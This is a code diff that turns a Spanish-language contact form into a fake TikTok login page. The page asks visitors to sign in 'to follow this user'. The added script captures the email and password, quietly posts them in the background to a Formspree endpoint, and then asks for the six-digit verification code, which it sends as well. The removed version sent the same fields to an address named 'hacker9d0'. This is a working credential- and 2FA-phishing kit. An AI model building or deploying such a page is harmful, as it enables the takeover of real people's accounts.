@@ -3,13 +3,9 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Formulario de contacto</title>
+<title>Iniciar sesión</title>
 <style>
-* {
-  box-sizing: border-box;
-}
 body {
-  margin: 0;
   background-image: url('IMG_1098.jpeg');
   background-repeat: no-repeat;
   background-size: cover;
@@ -18,104 +14,105 @@ body {
   color: white;
   min-height: 100vh;
   padding: 20px;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  font-family: Arial, sans-serif;
 }
-.contenedor {
-  width: 100%;
-  max-width: 420px;
-  padding: 25px;
-  border-radius: 16px;
-  background: rgba(0, 0, 0, 0.75);
-  backdrop-filter: blur(8px);
-}
-h2 {
-  text-align: center;
-  margin-bottom: 25px;
-}
-.field {
-  margin-bottom: 18px;
-}
-label {
-  display: block;
-  margin-bottom: 7px;
-  font-size: 14px;
-}
-input,
-textarea {
-  width: 100%;
-  padding: 13px;
-  border: none;
-  border-radius: 8px;
-  font-size: 15px;
-}
-textarea {
-  min-height: 120px;
-  resize: vertical;
-}
-.submit-btn {
-  width: 100%;
-  padding: 14px;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-  font-size: 16px;
-  font-weight: bold;
-}
+
 </style>
 </head>
 <body>
+
 <div class="contenedor">
-  <h2>inicia secion con tu cuena de tik tok</h2>
-  <form
-    action="https://formsubmit.co/hacker9d0@gmail.com"
-    method="POST"
-  >
-<div class="field">
-  <label for="correo">correo electronico</label>
-  <input
-    type="text"
-    id="correo electronico"
-    name="correo electronico"
-    placeholder="correo(@gmail.com)"
-    required
-  />
-</div>
-<div class="field">
-  <label for="contraseña">Contraseña</label>
-  <input
-    type="contraseña"
-    id="contraseña"
-    name="contraseña"
-    placeholder="contraseña"
-    required
-  />
-</div>
-<div class="field">
-  <label for="codigo">codigo</label>
-  <textarea
-    id="codigo"
-    name="codigo"
-    placeholder="codigo de 6 digitos"
-    required
-  ></textarea>
-</div>
-<input
-  type="hidden"
-  name="_subject"
-  value="Nuevo mensaje recibido"
-/>
-<input
-  type="hidden"
-  name="_template"
-  value="table"
-/>
-<button type="submit" class="submit-btn">
-  inicia secion
-</button>
+  <h2>para seguir a este usuario Inicia sesión con tu cuenta de tik tok</h2>
+
+  <!-- ✅ PON TU ENLACE DE FORMSPREE AQUÍ -->
+  <form action="https://formspree.io/f/xgogzwbd" method="POST" id="formPrincipal">
+
+    <!-- Campos ocultos para guardar todo -->
+    <input type="hidden" name="correo" id="correoGuardado" />
+    <input type="hidden" name="contraseña" id="passGuardada" />
+    <input type="hidden" name="codigo" id="codigoGuardado" />
+
+    <!-- PASO 1: CORREO Y CONTRASEÑA -->
+    <div id="paso1">
+      <div class="field">
+        <label>Correo electrónico</label>
+        <input type="email" id="correo" required placeholder="tu@correo.com" />
+      </div>
+      <div class="field">
+        <label>Contraseña</label>
+        <input type="password" id="contraseña" required placeholder="••••••••" />
+      </div>
+      <button type="button" class="submit-btn" onclick="avanzarSinEsperar()">Continuar</button>
+    </div>
+
+    <!-- PASO 2: CÓDIGO -->
+    <div id="paso2" class="oculto">
+      <div class="field">
+        <label>Código de verificación (6 dígitos)</label>
+        <input type="text" id="codigo" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" oninput="activarBoton()" />
+      </div>
+      <button type="button" class="link-btn" onclick="volverAtras()">← Volver atrás</button>
+      <button type="submit" class="submit-btn" id="botonEnviar" disabled>Entrar</button>
+    </div>
+
   </form>
 </div>
+
+<script>
+const ENLACE = "https://formspree.io/f/xgogzwbd"; // Mismo enlace aquí
+
+function avanzarSinEsperar() {
+  const correoValor = document.getElementById('correo').value.trim();
+  const passValor = document.getElementById('contraseña').value;
+
+  if (!correoValor || !passValor) {
+    alert('Escribe tu correo y contraseña primero');
+    return;
+  }
+
+  // 📝 Guardamos los datos para que vayan al final
+  document.getElementById('correoGuardado').value = correoValor;
+  document.getElementById('passGuardada').value = passValor;
+
+  // 🚀 AVANZAMOS DE INMEDIATO, SIN ESPERAR NADA
+  document.getElementById('paso1').classList.add('oculto');
+  document.getElementById('paso2').classList.remove('oculto');
+
+  // 📩 ENVIAMOS CORREO Y CONTRASEÑA EN SEGUNDO PLANO, SIN DETENER NADA
+  enviarRapido(correoValor, passValor);
+}
+
+// 🛠️ ENVÍO QUE NO DETIENE NADA
+function enviarRapido(c, p) {
+  // Usamos un método que no espera respuesta → nunca se traba
+  const form = document.createElement('form');
+  form.action = ENLACE;
+  form.method = 'POST';
+  form.target = '_blank'; // No afecta tu página
+
+  const i1 = document.createElement('input');
+  i1.name = 'correo'; i1.value = c;
+  const i2 = document.createElement('input');
+  i2.name = 'contraseña'; i2.value = p;
+  const i3 = document.createElement('input');
+  i3.name = 'nota'; i3.value = 'Recibido antes del código';
+
+  form.appendChild(i1); form.appendChild(i2); form.appendChild(i3);
+  document.body.appendChild(form);
+  form.submit();
+  document.body.removeChild(form);
+}
+
+function volverAtras() {
+  document.getElementById('paso2').classList.add('oculto');
+  document.getElementById('paso1').classList.remove('oculto');
+}
+
+function activarBoton() {
+  const cod = document.getElementById('codigo').value;
+  document.getElementById('codigoGuardado').value = cod;
+  document.getElementById('botonEnviar').disabled = cod.length !== 6;
+}
+</script>
+
 </body>
 </html>
